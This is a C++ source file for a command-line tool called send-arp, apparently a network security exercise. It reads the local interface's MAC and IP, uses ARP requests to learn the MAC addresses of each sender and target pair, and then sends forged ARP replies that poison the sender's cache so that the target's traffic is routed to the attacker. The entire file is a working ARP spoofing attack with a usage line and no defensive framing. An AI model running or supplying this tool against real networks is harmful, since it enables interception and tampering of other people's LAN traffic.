#include <bits/stdc++.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
using namespace std;

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

string get_attacker_mac(const string &name) {
    ifstream mac_file("/sys/class/net/" + name + "/address");
    if(!mac_file.is_open()){
        perror("MAC file open error");
        exit(-1);
    }
    string res;
    mac_file >> res;
    return res;
}

string get_attacker_IP_addr(const string &name) {
    int fd=socket(AF_INET, SOCK_DGRAM, 0);
    if(fd==-1){
        perror("Socket open error");
        exit(-1);
    }
    ifreq ifr;
    ifr.ifr_addr.sa_family=AF_INET;
    strncpy(ifr.ifr_name,name.c_str(),IFNAMSIZ-1);
    if(ioctl(fd, SIOCGIFADDR, &ifr)<0){
        perror("ioctl error");
        exit(-1);
    }
    sockaddr_in* sock_in=(sockaddr_in*)&ifr.ifr_addr;
    const string ip_addr=inet_ntoa(sock_in->sin_addr);
    return ip_addr;
}

int main(int argc, char* argv[]) {
    if (argc < 4 or (argc % 2 !=0)) {
        usage();
        return EXIT_FAILURE;
    }
    char* dev = argv[1];
    string attacker_mac = get_attacker_mac(dev);
    string attacker_ip = get_attacker_IP_addr(dev);
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (pcap == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return EXIT_FAILURE;
    }

    for (int i = 2; i + 1 < argc; i += 2) {
        string sender_ip = argv[i];
        string target_ip = argv[i + 1];
        EthArpPacket packet;

        // 1. ARP Request to get target MAC
        packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
        packet.eth_.smac_ = Mac(attacker_mac);
        packet.eth_.type_ = htons(EthHdr::Arp);
        packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        packet.arp_.pro_ = htons(EthHdr::Ip4);
        packet.arp_.hln_ = Mac::Size;
        packet.arp_.pln_ = Ip::Size;
        packet.arp_.op_ = htons(ArpHdr::Request);
        packet.arp_.smac_ = Mac(attacker_mac);
        packet.arp_.sip_ = htonl(Ip(attacker_ip));
        packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
        packet.arp_.tip_ = htonl(Ip(target_ip));

        int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket error: %s\n", pcap_geterr(pcap));
            continue;
        }

        Mac target_mac;
        while (true) {
            struct pcap_pkthdr* header;
            const u_char* pkt;
            res = pcap_next_ex(pcap, &header, &pkt);
            if (res == 0) continue;
            if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) break;

            EthHdr* eth = (EthHdr*)pkt;
            if (ntohs(eth->type_) != EthHdr::Arp) continue;

            ArpHdr* arp = (ArpHdr*)(pkt + sizeof(EthHdr));
            if (ntohs(arp->op_) != ArpHdr::Reply) continue;
            if (ntohl(arp->sip_) != Ip(target_ip)) continue;
            if (ntohl(arp->tip_) != Ip(attacker_ip)) continue;

            target_mac = arp->smac();
            break;
        }

        // 2. ARP Request to get sender MAC
        packet.arp_.tip_ = htonl(Ip(sender_ip));
        res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket error: %s\n", pcap_geterr(pcap));
            continue;
        }

        Mac sender_mac;
        while (true) {
            struct pcap_pkthdr* header;
            const u_char* pkt;
            res = pcap_next_ex(pcap, &header, &pkt);
            if (res == 0) continue;
            if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) break;

            EthHdr* eth = (EthHdr*)pkt;
            if (ntohs(eth->type_) != EthHdr::Arp) continue;

            ArpHdr* arp = (ArpHdr*)(pkt + sizeof(EthHdr));
            if (ntohs(arp->op_) != ArpHdr::Reply) continue;
            if (ntohl(arp->sip_) != Ip(sender_ip)) continue;
            if (ntohl(arp->tip_) != Ip(attacker_ip)) continue;

            sender_mac = arp->smac();
            break;
        }

        // 3. Send spoofed ARP Reply
        packet.eth_.dmac_ = sender_mac;
        packet.arp_.tmac_ = sender_mac;
        packet.arp_.tip_ = htonl(Ip(sender_ip));
        packet.arp_.sip_ = htonl(Ip(target_ip));
        packet.arp_.smac_ = Mac(attacker_mac);
        packet.arp_.op_ = htons(ArpHdr::Reply);

        res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "infection send failed: %s\n", pcap_geterr(pcap));
        }
    }

    pcap_close(pcap);
    return 0;
}
